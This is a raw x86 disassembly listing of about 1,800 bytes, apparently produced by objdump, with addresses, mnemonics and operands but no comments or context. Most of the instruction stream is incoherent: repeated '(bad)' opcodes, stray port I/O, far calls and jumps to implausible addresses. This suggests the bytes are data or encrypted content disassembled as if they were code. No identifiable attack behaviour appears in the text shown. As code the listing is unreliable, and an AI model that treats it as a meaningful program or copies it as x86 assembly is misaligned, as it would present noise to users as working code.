  40f9f2:	lods   eax,DWORD PTR ds:[esi]
  40f9f3:	fisubr WORD PTR [ecx+0x628f0f8d]
  40f9f9:	(bad)  
  40f9fa:	xchg   ebp,eax
  40f9fb:	daa    
  40f9fc:	call   0xc3343397
  40fa01:	(bad)  
  40fa02:	hlt    
  40fa03:	adc    BYTE PTR [ebx+0x40a98b69],dh
  40fa09:	das    
  40fa0a:	push   es
  40fa0b:	fs repnz pop ebx
  40fa0e:	fwait
  40fa0f:	or     al,0x9e
  40fa11:	or     al,0x9c
  40fa13:	or     BYTE PTR [esi],0x77
  40fa16:	jmp    0x61e1e104
  40fa1b:	cmp    DWORD PTR [ebx],ebx
  40fa1d:	shl    eax,0xfe
  40fa20:	out    0x69,al
  40fa22:	adc    eax,0x87b1aac2
  40fa27:	dec    edi
  40fa28:	cmp    eax,0xf0d70fef
  40fa2d:	das    
  40fa2e:	push   ecx
  40fa2f:	inc    ebp
  40fa30:	jbe    0x40fa54
  40fa32:	popf   
  40fa33:	jg     0x40fa67
  40fa35:	jae    0x40f9c3
  40fa37:	(bad)  
  40fa38:	aam    0x95
  40fa3a:	aas    
  40fa3b:	push   esp
  40fa3c:	sbb    esi,0x42
  40fa3f:	aam    0x85
  40fa41:	(bad)  
  40fa42:	cld    
  40fa43:	pushf  
  40fa44:	dec    eax
  40fa45:	(bad)  
  40fa47:	inc    ecx
  40fa48:	mov    edx,0xb5552c80
  40fa4d:	and    eax,0xf317e1d5
  40fa52:	inc    eax
  40fa53:	xor    DWORD PTR [esi],0x7
  40fa56:	adc    edi,ecx
  40fa58:	inc    edi
  40fa59:	mov    edx,0xe1df5685
  40fa5e:	imul   ebp,DWORD PTR [ecx],0x4c
  40fa61:	inc    esp
  40fa62:	push   ebx
  40fa63:	call   0x8a34d7c7
  40fa68:	cld    
  40fa69:	mov    esp,0x6f26ce2b
  40fa6e:	xor    al,0x36
  40fa70:	inc    ecx
  40fa71:	adc    DWORD PTR [edi-0x57bfa585],0xffffffaa
  40fa78:	je     0x40fa0d
  40fa7a:	int3   
  40fa7b:	popf   
  40fa7c:	fadd   QWORD PTR [ebx]
  40fa7e:	cmp    eax,eax
  40fa80:	aam    0xa0
  40fa82:	adc    DWORD PTR [esi+0x1e],esi
  40fa85:	push   cs
  40fa86:	scas   al,BYTE PTR es:[edi]
  40fa87:	shl    BYTE PTR [ecx+0x6419ac2d],1
  40fa8d:	lea    edx,[edi]
  40fa8f:	dec    esp
  40fa90:	and    DWORD PTR ds:0x1698f5be,esi
  40fa96:	sbb    al,0xbc
  40fa98:	clc    
  40fa99:	enter  0xdc1,0x7b
  40fa9d:	pop    edx
  40fa9e:	inc    edx
  40fa9f:	sub    ebp,DWORD PTR [edi]
  40faa1:	test   DWORD PTR [edi*2-0x7ef389a5],esp
  40faa8:	mov    edi,0xa996c922
  40faad:	add    esi,edi
  40faaf:	test   BYTE PTR [edi-0x6c],0xa6
  40fab3:	add    DWORD PTR [ebp-0x29fc9c19],eax
  40fab9:	sti    
  40faba:	pop    es
  40fabb:	arpl   WORD PTR [esi+0x2a05dad7],dx
  40fac1:	(bad)  
  40fac2:	mov    edx,0x2b0e7a6d
  40fac7:	fwait
  40fac8:	(bad)  
  40fac9:	xor    eax,0x2ee8e9e9
  40face:	xor    BYTE PTR [ebx+0x7f064bc7],al
  40fad4:	and    DWORD PTR [ebx],ecx
  40fad6:	push   cs
  40fad7:	cmp    DWORD PTR [ebx-0x1b3e3476],0x68
  40fade:	sub    BYTE PTR [ebx],ah
  40fae0:	mov    esp,0x3a72b581
  40fae5:	(bad)  
  40fae6:	cld    
  40fae7:	aam    0xa
  40fae9:	adc    edx,DWORD PTR [ebx+0x31a5930]
  40faef:	cmp    dh,BYTE PTR [esi]
  40faf1:	imul   ebx,DWORD PTR [esp+eax*2],0x43
  40faf5:	test   eax,0x176cb9e6
  40fafa:	fld    TBYTE PTR [edi+0x51]
  40fafd:	inc    edi
  40fafe:	jae    0x40fb48
  40fb00:	fwait
  40fb01:	js     0x40fb21
  40fb03:	call   0x1b78c896
  40fb08:	or     al,bh
  40fb0a:	xor    DWORD PTR [edi+ebp*2],0xffffffd6
  40fb0e:	adc    edx,esi
  40fb10:	mov    al,ds:0x8edadf71
  40fb15:	dec    edi
  40fb16:	push   DWORD PTR [ebx+0x79cebc0a]
  40fb1c:	jb     0x40fae6
  40fb1e:	mov    ds:0xca90f1bb,al
  40fb23:	pop    edi
  40fb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb25:	push   edi
  40fb26:	mov    edi,0x10e46740
  40fb2b:	es xchg ecx,eax
  40fb2d:	sbb    DWORD PTR [ebx],eax
  40fb2f:	div    BYTE PTR [eax+0x7927e0c2]
  40fb35:	stos   BYTE PTR es:[edi],al
  40fb36:	adc    al,BYTE PTR [esi-0x4f]
  40fb39:	mov    esp,0x48d456b6
  40fb3e:	jmp    0x9652af8
  40fb43:	mov    DWORD PTR [eax+edi*8+0x2e],esi
  40fb47:	int    0xa9
  40fb49:	and    BYTE PTR [ecx-0x49779cd1],ch
  40fb4f:	sbb    dh,BYTE PTR [ecx+0x17a9dbdd]
  40fb55:	int3   
  40fb56:	dec    eax
  40fb57:	jb     0x40fbc0
  40fb59:	leave  
  40fb5a:	inc    esp
  40fb5b:	pop    es
  40fb5c:	push   cs
  40fb5d:	mov    esi,0xd72f07a7
  40fb62:	mov    dh,0x74
  40fb64:	jnp    0x40fb9d
  40fb66:	xor    al,BYTE PTR [eax+esi*1]
  40fb69:	xchg   ebp,eax
  40fb6a:	fcmovnb st,st(0)
  40fb6c:	and    bh,BYTE PTR [eax+0x35]
  40fb6f:	aaa    
  40fb70:	aad    0x29
  40fb72:	ror    ebx,1
  40fb74:	data16 fwait
  40fb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb77:	inc    edx
  40fb78:	push   esp
  40fb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb7a:	fild   QWORD PTR [edx-0x48a37ab2]
  40fb80:	pop    ecx
  40fb81:	inc    esp
  40fb82:	loopne 0x40fb2d
  40fb84:	pop    ebx
  40fb85:	scas   eax,DWORD PTR es:[edi]
  40fb86:	mov    ah,0xe3
  40fb88:	pop    esp
  40fb89:	dec    ebp
  40fb8a:	sar    BYTE PTR [ebp+0x25],0xc
  40fb8e:	leave  
  40fb8f:	test   BYTE PTR [edx+ebx*4-0x5c],ch
  40fb93:	fstp   QWORD PTR [ebx+eax*2-0x4d]
  40fb97:	sub    DWORD PTR [ebp-0x402fad68],esp
  40fb9d:	cs loopne 0x40fb22
  40fba0:	xchg   edx,eax
  40fba1:	inc    esi
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x58
  40fbc9:	adc    BYTE PTR [eax+eax*8],0xd0
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fb62
  40fbd5:	dec    ebx
  40fbd6:	mov    eax,DWORD PTR [edi]
  40fbd8:	gs mov ch,0x8d
  40fbdb:	mov    dl,0x87
  40fbdd:	(bad)  
  40fbde:	xor    ebx,DWORD PTR [ebp+0x776c6aee]
  40fbe4:	mov    ch,0x49
  40fbe6:	and    DWORD PTR [edx*1+0x1e3eff53],edx
  40fbed:	jmp    0x378f4ef9
  40fbf2:	push   ebp
  40fbf3:	push   edx
  40fbf4:	aam    0x34
  40fbf6:	pop    ebp
  40fbf7:	mov    ecx,0x4e6294e7
  40fbfc:	jnp    0x40fc70
  40fbfe:	scas   al,BYTE PTR es:[edi]
  40fbff:	mov    ecx,0x91ec9ff8
  40fc04:	scas   eax,DWORD PTR es:[edi]
  40fc05:	xchg   ebp,eax
  40fc06:	mov    ds:0x19b3f070,al
  40fc0b:	js     0x40fc23
  40fc0d:	inc    ebp
  40fc0e:	fadd   st,st(0)
  40fc10:	rol    DWORD PTR [eax-0x6b],0xb4
  40fc14:	fistp  QWORD PTR [ecx+esi*8-0x5a299df0]
  40fc1b:	dec    ebx
  40fc1c:	test   ah,0x8e
  40fc1f:	retf   0xefc2
  40fc22:	repnz nop
  40fc24:	jnp    0x40fbee
  40fc26:	inc    esi
  40fc27:	adc    eax,0x63c1f1fa
  40fc2c:	sub    DWORD PTR [eax+0x1a],edi
  40fc2f:	stc    
  40fc30:	cmp    ebx,DWORD PTR [ebx+edi*1]
  40fc33:	dec    edx
  40fc34:	enter  0xee2d,0x24
  40fc38:	cmc    
  40fc39:	mov    eax,ds:0xc6f907bc
  40fc3e:	lods   al,BYTE PTR ds:[esi]
  40fc3f:	dec    esp
  40fc40:	mul    BYTE PTR [eax+0x56]
  40fc43:	addr16 xchg esi,eax
  40fc45:	and    DWORD PTR [esp+esi*1-0x3a7d47c0],esp
  40fc4c:	mov    ds:0x6af68d63,al
  40fc51:	adc    esi,DWORD PTR [esi-0x3a]
  40fc54:	idiv   DWORD PTR [esi]
  40fc56:	dec    ecx
  40fc58:	into   
  40fc59:	add    BYTE PTR [esi+0x5c9a9cc1],0x88
  40fc60:	and    ebx,DWORD PTR [ebx-0x7d]
  40fc63:	mov    edx,DWORD PTR [ecx]
  40fc65:	sbb    dl,BYTE PTR [edi-0x2a63a539]
  40fc6b:	cmp    dh,BYTE PTR [edx+ebp*4+0x482ff32b]
  40fc72:	sub    esp,edx
  40fc74:	lds    ebp,FWORD PTR [eax+0x71c4d33a]
  40fc7a:	jle    0x40fc49
  40fc7c:	mov    ah,0xdf
  40fc7e:	pop    ebp
  40fc7f:	jnp    0x40fcb6
  40fc81:	(bad)  
  40fc82:	ins    BYTE PTR es:[edi],dx
  40fc83:	daa    
  40fc84:	sbb    DWORD PTR [ebx+0x15],edi
  40fc87:	aaa    
  40fc88:	mov    bl,0x93
  40fc8a:	jb     0x40fc18
  40fc8c:	(bad)  
  40fc8e:	jno    0x40fc9e
  40fc90:	cwde   
  40fc91:	xchg   ebp,eax
  40fc92:	push   eax
  40fc93:	aam    0x19
  40fc95:	daa    
  40fc96:	mov    ds:0x2b543900,eax
  40fc9b:	out    0x62,eax
  40fc9d:	inc    eax
  40fc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc9f:	cmp    bh,BYTE PTR [ecx]
  40fca1:	test   bl,bl
  40fca3:	mov    ah,BYTE PTR [edx-0x544b0e35]
  40fca9:	sbb    BYTE PTR [ecx],0x6a
  40fcac:	cmc    
  40fcad:	(bad)  
  40fcae:	xor    al,0xcf
  40fcb0:	icebp  
  40fcb1:	(bad)  ds:0x2ee89d58
  40fcb7:	(bad)  
  40fcb8:	and    eax,0xb74d17a6
  40fcbd:	xchg   BYTE PTR [ecx+0x1869617d],ah
  40fcc3:	rcr    DWORD PTR [esi+ebp*4+0xe],0xf2
  40fcc8:	pop    ebp
  40fcc9:	lea    esi,[esi+ecx*1]
  40fccc:	pushf  
  40fccd:	push   eax
  40fcce:	lahf   
  40fccf:	inc    eax
  40fcd0:	ror    BYTE PTR [esi-0x3cc8c06f],cl
  40fcd6:	or     ax,WORD PTR [eax-0x8e49353]
  40fcdd:	pop    ebp
  40fcde:	sub    cl,BYTE PTR [eax]
  40fce0:	sbb    bh,BYTE PTR ds:0x231
  40fce5:	mov    BYTE PTR [ecx+0x7601402f],ch
  40fceb:	in     al,dx
  40fcec:	lahf   
  40fced:	jp     0x40fd42
  40fcef:	fstp   QWORD PTR [edx+0x28]
  40fcf2:	test   al,0xe
  40fcf4:	or     cl,0x2c
  40fcf7:	sti    
  40fcf8:	push   ss
  40fcf9:	pop    ebx
  40fcfa:	and    DWORD PTR [ecx],esi
  40fcfc:	dec    edi
  40fcfd:	popa   
  40fcfe:	dec    edx
  40fcff:	push   ebp
  40fd00:	icebp  
  40fd01:	in     al,0xf9
  40fd03:	cdq    
  40fd04:	out    dx,al
  40fd05:	mov    esp,0x5148210c
  40fd0a:	sub    bl,BYTE PTR [eax-0x34]
  40fd0d:	outs   dx,BYTE PTR ds:[esi]
  40fd0e:	sub    BYTE PTR [edx-0x1],bh
  40fd11:	or     dh,bl
  40fd13:	dec    ecx
  40fd14:	in     eax,dx
  40fd15:	je     0x40fd34
  40fd17:	out    0xf,eax
  40fd19:	jnp    0x40fd82
  40fd1b:	and    al,0xe5
  40fd1d:	mov    dl,BYTE PTR [eax+0x44]
  40fd20:	jne    0x40fd1e
  40fd22:	sub    al,0x8e
  40fd24:	in     eax,0x64
  40fd26:	xchg   ebx,eax
  40fd27:	loop   0x40fd3d
  40fd29:	daa    
  40fd2a:	scas   al,BYTE PTR es:[edi]
  40fd2b:	out    dx,eax
  40fd2c:	sub    DWORD PTR [ecx+0x7273c203],ebx
  40fd32:	sub    BYTE PTR [esi-0x142835be],ch
  40fd38:	repz in eax,dx
  40fd3a:	sbb    eax,0x376214b4
  40fd3f:	arpl   WORD PTR ds:0xad6dcc6c,sp
  40fd45:	test   eax,0xbaeabfe2
  40fd4a:	sbb    al,0x37
  40fd4c:	sbb    dh,dl
  40fd4e:	pop    edx
  40fd4f:	aas    
  40fd50:	fisttp QWORD PTR [ecx-0x50]
  40fd53:	retf   
  40fd54:	int3   
  40fd55:	push   ds
  40fd56:	fdiv   DWORD PTR [edx+0x7e]
  40fd59:	pop    ebx
  40fd5a:	mov    al,ds:0x5d6267bf
  40fd5f:	fs dec esi
  40fd61:	push   es
  40fd62:	mov    ecx,eax
  40fd64:	in     al,dx
  40fd65:	and    dh,al
  40fd67:	nop
  40fd68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd69:	push   0x69
  40fd6b:	and    edx,esp
  40fd6d:	pop    ds
  40fd6e:	mov    cl,BYTE PTR [ecx+0xfa72d5d]
  40fd74:	and    BYTE PTR [ecx],bl
  40fd76:	ds rcr edx,1
  40fd79:	das    
  40fd7a:	idiv   DWORD PTR [eax+0x13]
  40fd7d:	add    DWORD PTR [edi],0xffffffac
  40fd80:	dec    edi
  40fd81:	cmp    BYTE PTR [edx],dl
  40fd83:	pop    ebp
  40fd84:	aaa    
  40fd85:	in     al,0x3c
  40fd87:	ins    BYTE PTR es:[edi],dx
  40fd88:	loop   0x40fdd5
  40fd8a:	in     al,dx
  40fd8b:	adc    DWORD PTR [ecx-0x6306546f],edi
  40fd91:	mov    ebx,0x7de54cd3
  40fd96:	jge    0x40fdbb
  40fd98:	or     esp,DWORD PTR [edx+0x5f]
  40fd9b:	(bad)  
  40fd9c:	test   BYTE PTR [edx+0x35f1ca4c],0x6c
  40fda3:	or     al,0x20
  40fda5:	jmp    0x40fd3c
  40fda7:	and    DWORD PTR [eax+0x5a136cc6],edx
  40fdad:	and    al,0xb6
  40fdaf:	loope  0x40fd78
  40fdb1:	xor    al,0x97
  40fdb3:	push   ebp
  40fdb4:	fidiv  WORD PTR [edi-0x5153962]
  40fdba:	adc    BYTE PTR [eax+0xe],dh
  40fdbd:	popa   
  40fdbe:	retf   
  40fdbf:	scas   al,BYTE PTR es:[edi]
  40fdc0:	mov    dl,0x9
  40fdc2:	das    
  40fdc3:	(bad)  
  40fdc4:	push   0x7d0ccdfa
  40fdc9:	jg     0x40fd7b
  40fdcb:	xchg   ecx,eax
  40fdcc:	xor    ecx,DWORD PTR [ebp-0x69]
  40fdcf:	ror    DWORD PTR [ecx-0x1c35d5c4],1
  40fdd5:	mov    eax,0x42e81c84
  40fdda:	(bad)  
  40fddb:	in     eax,dx
  40fddc:	push   ebp
  40fddd:	jge    0x40fdf4
  40fddf:	cs test eax,0xf4e6cee9
  40fde5:	dec    ebp
  40fde6:	dec    edi
  40fde7:	and    al,0x38
  40fde9:	mov    ebx,0xf2922f07
  40fdee:	ret    
  40fdef:	loop   0x40fdcf
  40fdf1:	sub    dl,al
  40fdf3:	dec    edx
  40fdf4:	mov    ch,BYTE PTR [edi+edx*1+0x5d900a44]
  40fdfb:	or     bl,cl
  40fdfd:	xchg   edi,eax
  40fdfe:	cmp    DWORD PTR [ebp+ebx*4-0x6f6d48ed],edi
  40fe05:	dec    ebx
  40fe06:	pushf  
  40fe07:	(bad)  
  40fe08:	adc    DWORD PTR [ecx+0x39],eax
  40fe0b:	sub    DWORD PTR [ecx-0x25],ebp
  40fe0e:	out    0x3b,eax
  40fe10:	mov    ?,WORD PTR [eax]
  40fe12:	loop   0x40fe13
  40fe14:	les    ebx,FWORD PTR [edi]
  40fe16:	pop    ebp
  40fe17:	sbb    ecx,edi
  40fe19:	lds    esp,FWORD PTR [ebx-0x8348ea1]
  40fe1f:	mov    eax,ds:0x89776955
  40fe24:	out    0xb6,al
  40fe26:	mov    ds:0xe8fb182b,eax
  40fe2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe2c:	sub    al,0x2a
  40fe2e:	push   ecx
  40fe2f:	cwde   
  40fe30:	jo     0x40fe3c
  40fe32:	mov    al,BYTE PTR [edx+0x492c460e]
  40fe38:	call   0x9b16:0x7336b17c
  40fe3f:	push   edi
  40fe40:	ret    
  40fe41:	in     eax,dx
  40fe42:	ss rol eax,0x8e
  40fe46:	pop    edi
  40fe47:	jmp    0x156c1d49
  40fe4c:	or     DWORD PTR [ebp+edx*2+0x1],ebx
  40fe50:	das    
  40fe51:	push   ss
  40fe52:	sub    eax,0x6efe84f8
  40fe57:	push   ebp
  40fe58:	neg    bl
  40fe5a:	bound  eax,QWORD PTR [ecx+ebx*8+0x63]
  40fe5e:	add    edx,DWORD PTR [ecx]
  40fe60:	pop    ebx
  40fe61:	ins    DWORD PTR es:[edi],dx
  40fe62:	(bad)  
  40fe63:	pop    ds
  40fe64:	mov    edx,0x8d119c0c
  40fe69:	sub    DWORD PTR [ebx-0x29070820],esp
  40fe6f:	outs   dx,DWORD PTR ds:[esi]
  40fe70:	arpl   WORD PTR [ecx-0x7a],ax
  40fe73:	scas   eax,DWORD PTR es:[edi]
  40fe74:	inc    ecx
  40fe75:	cwde   
  40fe76:	cmp    DWORD PTR [ebx+eax*1],edx
  40fe79:	mov    esp,0x43568a89
  40fe7e:	jmp    0x40fe4d
  40fe80:	daa    
  40fe81:	test   BYTE PTR [edx+ebx*1+0x19],cl
  40fe85:	inc    esp
  40fe86:	mov    ds:0x2878ddb2,eax
  40fe8b:	add    eax,0x2d82e310
  40fe90:	mov    al,ds:0x855494cc
  40fe95:	add    dh,BYTE PTR [esi+0x44]
  40fe98:	ret    
  40fe99:	cli    
  40fe9a:	daa    
  40fe9b:	lea    ebx,[ecx-0xb]
  40fe9e:	push   es
  40fe9f:	dec    ecx
  40fea0:	adc    dh,BYTE PTR [edi]
  40fea2:	or     BYTE PTR ss:[edi+0x77],bh
  40fea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea7:	daa    
  40fea8:	or     ch,BYTE PTR [ebx]
  40feaa:	dec    ecx
  40feab:	(bad)  
  40feac:	js     0x40ff29
  40feae:	inc    ebx
  40feaf:	pop    eax
  40feb0:	aad    0x10
  40feb2:	push   esp
  40feb3:	daa    
  40feb4:	(bad)  
  40feb5:	fsub   DWORD PTR [ecx]
  40feb7:	pop    esi
  40feb8:	pop    es
  40feb9:	es pop esp
  40febb:	out    dx,al
  40febc:	(bad)  
  40febd:	nop
  40febe:	pusha  
  40febf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec0:	fwait
  40fec1:	jp     0x40ff06
  40fec3:	(bad)  
  40fec4:	sar    edx,1
  40fec6:	or     DWORD PTR [ecx+edx*8+0x2ac38156],0xffffffda
  40fece:	mov    ds,WORD PTR [ebx+0x5f2b14a7]
  40fed4:	sbb    esp,DWORD PTR ds:0x330c458b
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xf5fa4346
  40fef3:	xchg   ebp,eax
  40fef4:	jmp    0x40fed4
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40fe8d
  40fefe:	inc    edx
  40feff:	(bad)  
  40ff00:	sbb    edx,DWORD PTR [esi-0x47]
  40ff03:	sbb    DWORD PTR [esi],ebp
  40ff05:	and    al,0xfc
  40ff07:	dec    ebx
  40ff08:	scas   eax,DWORD PTR es:[edi]
  40ff09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff0a:	jns    0x40ff53
  40ff0c:	xchg   ebx,eax
  40ff0d:	xchg   edi,eax
  40ff0e:	or     ebx,DWORD PTR [eax+0x54d5bc16]
  40ff14:	or     DWORD PTR [esp+edi*8+0x407aa9b5],eax
  40ff1b:	jmp    0x38b4:0x792e6d62
  40ff22:	ss push ss
  40ff24:	and    al,0xa
  40ff26:	arpl   dx,ax
  40ff28:	int    0x8
  40ff2a:	inc    edi
  40ff2b:	aas    
  40ff2c:	mov    ecx,0x88c0a8a7
  40ff31:	and    ah,BYTE PTR [ebp-0x1047edab]
  40ff37:	adc    ebx,0x54579aab
  40ff3d:	mov    ebx,0xb0475807
  40ff42:	fcom   st(1)
  40ff44:	mov    dh,0xcf
  40ff46:	xor    ax,0xa3d9
  40ff4a:	adc    BYTE PTR [ebx],0x58
  40ff4d:	sti    
  40ff4e:	inc    esi
  40ff4f:	int3   
  40ff50:	cdq    
  40ff51:	stc    
  40ff52:	test   eax,0xaebd6d81
  40ff57:	aaa    
  40ff58:	call   0x2adc:0xb7d7ba46
  40ff5f:	fmul   DWORD PTR [edx+0x3]
  40ff62:	sub    DWORD PTR [ebx+0x6c25ed5b],edi
  40ff68:	(bad)  
  40ff69:	js     0x40ff2f
  40ff6b:	sbb    ah,BYTE PTR [ebx+0x36cbe148]
  40ff71:	hlt    
  40ff72:	push   ds
  40ff73:	sbb    DWORD PTR [esi+0x73],esi
  40ff76:	cmp    BYTE PTR [ebx],bh
  40ff78:	inc    ebx
  40ff79:	(bad)  
  40ff7a:	sar    BYTE PTR [ecx],1
  40ff7c:	outs   dx,BYTE PTR ds:[esi]
  40ff7d:	lods   eax,DWORD PTR ds:[esi]
  40ff7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff7f:	xor    BYTE PTR [ecx],bh
  40ff81:	or     dh,al
  40ff83:	loop   0x40ff42
  40ff85:	retf   
  40ff86:	(bad)  
  40ff87:	into   
  40ff88:	cmp    BYTE PTR [eax],dh
  40ff8a:	mov    eax,ds:0x2df96303
  40ff8f:	inc    esp
  40ff90:	and    al,0xb0
  40ff92:	pop    ss
  40ff93:	repz inc edi
  40ff95:	lods   eax,DWORD PTR ds:[esi]
  40ff96:	ins    DWORD PTR es:[edi],dx
  40ff97:	fs cmp al,0xf9
  40ff9a:	rol    ch,0x86
  40ff9d:	sar    BYTE PTR [eax],0x3f
  40ffa0:	jge    0x410008
  40ffa2:	lods   al,BYTE PTR ds:[esi]
  40ffa3:	xchg   esi,eax
  40ffa4:	aam    0x3c
  40ffa6:	in     eax,dx
  40ffa7:	dec    esi
  40ffa8:	in     eax,dx
  40ffa9:	inc    eax
  40ffaa:	out    0xf7,al
  40ffac:	jl     0x40ffee
  40ffae:	mov    edx,0xe82e709
  40ffb3:	mov    dh,0x5b
  40ffb5:	xchg   edi,eax
  40ffb6:	jge    0x40ff8a
  40ffb8:	cmp    DWORD PTR [edx],esp
  40ffba:	call   0x51f8:0xe09ce211
  40ffc1:	(bad)  
  40ffc3:	and    al,0xc5
  40ffc5:	mov    edx,0xc75c4183
  40ffca:	and    esp,ebp
  40ffcc:	cwde   
  40ffcd:	dec    ecx
  40ffce:	retf   
  40ffcf:	aas    
  40ffd0:	sti    
  40ffd1:	clc    
  40ffd2:	dec    esi
  40ffd3:	adc    DWORD PTR [esi],edi
  40ffd5:	inc    ecx
  40ffd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd7:	jl     0x40ffee
  40ffd9:	stos   BYTE PTR es:[edi],al
  40ffda:	test   al,0x75
  40ffdc:	cmp    DWORD PTR [ebx-0x6ae0a016],ecx
  40ffe2:	xor    ecx,0x34
  40ffe5:	in     eax,0xd3
  40ffe7:	push   cs
  40ffe8:	push   ds
  40ffe9:	adc    eax,0x7d408a34
  40ffee:	test   BYTE PTR [esi-0x58710ca9],dl
  40fff4:	mov    ebp,0x13a03928
  40fff9:	pop    eax
  40fffa:	pop    edx
  40fffb:	mov    ebx,0xb0fb24e4
  410000:	outs   dx,BYTE PTR ds:[esi]
  410001:	repnz cmp esp,DWORD PTR [ecx+edi*8-0x1a7684c]
  410009:	pop    esp
  41000a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000b:	sbb    DWORD PTR [ebx-0x2a],esp
  41000e:	inc    eax
  41000f:	mov    ch,0xfc
  410011:	jb     0x41003f
  410013:	fdivr  QWORD PTR [edx]
  410015:	mov    ebx,0x7c8572c5
  41001a:	jno    0x41004b
  41001c:	mov    edx,DWORD PTR [edi-0x5230d8ff]
  410022:	jns    0x410085
  410024:	in     al,dx
  410025:	mov    ah,0x98
  410027:	fisub  WORD PTR [edi+0x64]
  41002a:	(bad)  
  41002b:	fidiv  DWORD PTR [ebp-0x1501005c]
  410031:	cld    
  410032:	xchg   ebx,eax
  410033:	(bad)  
  410034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410035:	cmp    eax,0x7b2cfa1f
  41003a:	inc    ebp
  41003b:	loopne 0x40ffd8
  41003d:	inc    ebp
  41003e:	xchg   esp,eax
  41003f:	jb     0x41003f
  410041:	xchg   ebp,eax
  410042:	xor    eax,0xf5d98267
  410047:	or     BYTE PTR [ebx+0xb88d3c0],bh
  41004d:	test   al,0x5a
  41004f:	fld    QWORD PTR ds:0xe67e1056
  410055:	rol    esp,0x27
  410058:	lahf   
  410059:	adc    al,0x48
  41005b:	xor    esp,DWORD PTR [eax]
  41005d:	mov    ah,bh
  41005f:	and    DWORD PTR [ebx-0x1],ecx
  410062:	mov    ch,BYTE PTR [ebp+0x51]
  410065:	jo     0x41001f
  410067:	xor    DWORD PTR [eax],esp
  410069:	pop    es
  41006a:	inc    ebx
  41006b:	rcl    BYTE PTR [edx-0x24],cl
  41006e:	pop    esp
  41006f:	sbb    esp,DWORD PTR [esi+0x353f4d74]
  410075:	mov    edi,0xc475886e
  41007a:	dec    edx
  41007b:	inc    edx
  41007c:	sbb    bh,BYTE PTR [edi+edx*1-0xb]
  410080:	ins    DWORD PTR es:[edi],dx
  410081:	xchg   edi,eax
  410082:	xchg   ecx,eax
  410083:	jnp    0x4100e9
  410085:	push   esi
  410086:	repnz stc 
  410088:	lds    ebp,FWORD PTR ds:0x5386195f
  41008e:	cli    
  41008f:	rol    BYTE PTR [ebp-0x6f],cl
  410092:	repz ja 0x41007a
  410095:	test   BYTE PTR [ecx+ebp*1-0xc235459],bh
  41009c:	sub    al,0xbc
  41009e:	aad    0x6c
  4100a0:	popf   
  4100a1:	mov    dl,0x8d
  4100a3:	sbb    al,0x20
  4100a5:	cmp    esi,esi
  4100a7:	mov    ds:0x575452e2,al
  4100ac:	je     0x4100c6
  4100ae:	or     eax,0xe295612f
  4100b3:	mov    ah,0xbc
  4100b5:	fsubp  st(5),st
  4100b7:	push   ecx
  4100b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100b9:	loopne 0x4100e7
  4100bb:	lea    edi,[edi-0x4af54b5c]
  4100c1:	fimul  WORD PTR [ebx+eiz*2+0x7324201f]
  4100c8:	rol    DWORD PTR [ebx+0x51],cl
  4100cb:	ret    
  4100cc:	test   al,0x8c
  4100ce:	push   edi
  4100cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100d0:	and    BYTE PTR [ebx+0x77],ch
  4100d3:	dec    edi
  4100d4:	inc    esp
  4100d5:	inc    ecx
  4100d6:	push   esp
  4100d7:	mov    dl,dl
  4100d9:	sbb    esp,eax
  4100db:	jnp    0x410086
  4100dd:	dec    esp
  4100de:	jle    0x4100dc
  4100e0:	jge    0x410075
  4100e2:	loope  0x410105
  4100e4:	add    bh,0x37
  4100e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100e8:	nop
  4100e9:	xor    al,0xaa
  4100eb:	outs   dx,DWORD PTR ds:[esi]
  4100ec:	(bad)  
  4100ee:	mov    WORD PTR [edi],es
  4100f0:	lahf   
  4100f1:	inc    ecx
  4100f2:	mov    dl,0x8c
  4100f4:	lods   eax,DWORD PTR ds:[esi]
  4100f5:	in     al,dx
  4100f6:	xchg   edx,eax
  4100f7:	mov    edi,0x2e781d00
  4100fc:	add    bh,ah
  4100fe:	pop    edi
  4100ff:	fadd   QWORD PTR [edx]
  410101:	call   0x8baa8b26
  410106:	xor    DWORD PTR gs:[ebp+0x75],0xf83eff29
  41010e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41010f:	cmc    
  410110:	in     al,dx
  410111:	push   ss
  410112:	mov    edi,?
  410114:	gs (bad) 
  410116:	xlat   BYTE PTR ds:[ebx]
  410117:	or     al,0x9e
  410119:	mov    ah,0x72
  41011b:	xor    dl,al
  41011d:	push   cs
  41011e:	arpl   bp,ax
  410120:	fldenv [ecx]
  410122:	sub    edx,DWORD PTR [ebx-0x7ccc48d0]
  410128:	jg     0x41010a
  41012a:	addr16 cwde 
